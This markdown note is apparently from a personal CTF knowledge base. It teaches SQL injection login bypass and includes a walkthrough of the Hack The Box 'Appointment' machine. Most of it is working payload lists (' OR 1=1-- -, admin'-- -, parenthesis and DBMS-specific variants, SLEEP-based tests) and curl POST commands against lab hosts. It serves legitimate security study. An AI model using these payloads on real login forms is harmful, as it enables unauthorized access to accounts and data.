---
tags: [web, sqli]
---

> **SQL Injection (SQLi)** is a code injection technique that exploits vulnerabilities in an application's database layer. This guide focuses on what we've actually practiced — the login panel bypass — and the essential fundamentals.

---

## Quickstart — The Universal Test

```bash
# The 5 characters that flag SQLi in 90% of CTF challenges:
'       # single quote
"       # double quote
\       # backslash (escape char, triggers errors)
)       # closing parenthesis (nested queries)
-- -    # comment (MySQL style)
```

---

## Login Panel Bypass — SQLi in login forms

The typical pattern of a vulnerable login query is:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

If the app concatenates your input directly without sanitization, you can manipulate the SQL logic to authenticate without valid credentials. The goal is to make the `WHERE` condition always evaluate to `TRUE`.

### Step 1 — Understand the injection context

Test **both fields** (username and password) separately:

```bash
# Test 1: Error with single quote in username?
Username: admin'
Password: test

# Test 2: Error with double quote?
Username: admin"
Password: test

# Test 3: Error in the password field?
Username: admin
Password: test'

# Test 4: Backslash?
Username: admin\
Password: test
```

> 💡 **If you see a SQL error** → the app is vulnerable and you know where to inject.
> 💡 **If no error but the page changes** (e.g. "Wrong password" vs blank page) → possible boolean blind.
> 💡 **If no visible difference** → try time-based blind.
> 💡 **If no errors or changes but login works with `admin'-- -`** → the app is silently vulnerable — the SQL injection worked but errors are suppressed. This is the most common CTF scenario.

### Real example — HTB Appointment

This exact bypass works on the **Appointment** machine:

```
1. Login form with username + password
2. Gobuster reveals no hidden paths → the login IS the attack surface
3. Test: admin' in username → no visible error
4. Payload: admin'-- - in username, empty password → ✅ LOGIN
5. Underlying query: SELECT * FROM users WHERE username='admin'-- -' AND password=''
6. The -- - comments out the password check → authenticated as admin
```

**Key lessons from Appointment:**
- **No error ≠ no vulnerability** — the injection worked silently
- **Gobuster first** — confirm there are no hidden endpoints before focusing on the login
- **`admin'-- -` with empty password** — test this before any complex payload
- **The flag was on the dashboard** — no privilege escalation, no file reading

### Step 2 — Classic bypass payloads

Try these in the **username** field, leaving the password empty or with any value:

```sql
-- Universal payloads (work on MySQL, PostgreSQL, MSSQL)
admin'-- -
admin'#
admin'/*
' OR 1=1-- -
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
" OR "1"="1"-- -
" OR 1=1-- -
') OR ('1'='1
') OR 1=1-- -
admin' OR '1'='1

-- Without knowing any username — OR returns the first user
' OR '1'='1'-- -
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
OR 1=1-- -
OR '1'='1'-- -

-- Admin-specific — if you know the admin user exists
admin'-- -
admin' #
admin'/*
```

### Step 3 — If there are parentheses in the query

Many apps use functions like `MD5()`, `SHA1()`, or simply parentheses:

```sql
-- Example of vulnerable query with hash:
-- SELECT * FROM users WHERE (username='$user') AND (password=MD5('$pass'))

') OR 1=1-- -
') OR ('1'='1
') OR 1=1#
') OR ('1'='1')-- -

-- Double parentheses
')) OR 1=1-- -
')) OR ('1'='1

-- With hash on password
admin')-- -
') OR 1=1) AND ('x'='x
' OR 1=1) AND MD5('x')=MD5('x
```

### DBMS-specific payloads

| DBMS | Payload | Note |
| :--- | :------ | :--- |
| **MySQL** | `admin'-- -` | Space after `--` is mandatory |
| **MySQL** | `admin'#` | `#` doesn't need a space |
| **MySQL** | `admin'/*` | Unclosed inline comment |
| **PostgreSQL** | `admin'--` | `--` without extra space |
| **PostgreSQL** | `admin'/**/` | Inline comment |
| **MSSQL** | `admin'--` | Same as PostgreSQL |
| **Oracle** | `admin'--` | Oracle `--` needs a space |
| **SQLite** | `admin'--` | `--` with or without space |

---

## Quick checklist for login forms

1. **Test `'` in username** → if SQL error → vulnerable
2. **`admin'-- -`** → classic bypass if admin exists
3. **`' OR 1=1-- -`** → bypass without knowing a username
4. **`') OR 1=1-- -`** → if there are parentheses
5. **`' OR 1=1#`** → alternative comment
6. **If nothing works** → try time-based blind with `SLEEP()`
7. **Don't forget the password field** → sometimes it's vulnerable even if username isn't

### curl for manual form testing

```bash
# Basic POST
curl -d "user=admin'-- -&pass=" http://target.htb/login.php
curl -d "user=' OR 1=1-- -&pass=" http://target.htb/login.php

# With --data-urlencode if you need explicit encoding
curl --data-urlencode "user=' OR 1=1-- -" --data-urlencode "pass=" http://target.htb/login.php

# JSON login
curl -X POST http://target.htb/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'-- -","password":"test"}'

# Follow redirects and show headers (to see session Set-Cookie)
curl -d "user=admin'-- -&pass=" http://target.htb/login.php -L -v
```

---

## Common CTF errors

| Error | Solution |
| :---- | :------ |
| Single quotes don't break the query | Try double quotes, backslash, parentheses, or no quote (integer context) |
| The comment doesn't work | Try `-- -`, `--`, `#`, `/**/`, or `;` (stacked) |
| No visible difference between true/false | Try time-based: `' OR IF(1=1,SLEEP(3),0)-- -` |
| Server uses `addslashes()` / magic quotes | Try `admin\' OR 1=1-- -` (backslash escapes the escape) |

---

## 🔗 Related

**Machines:** [[📅 Appointment]]

**Guides:** [[🐬 MySQL]], [[💣 Gobuster]]

---

## References

- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
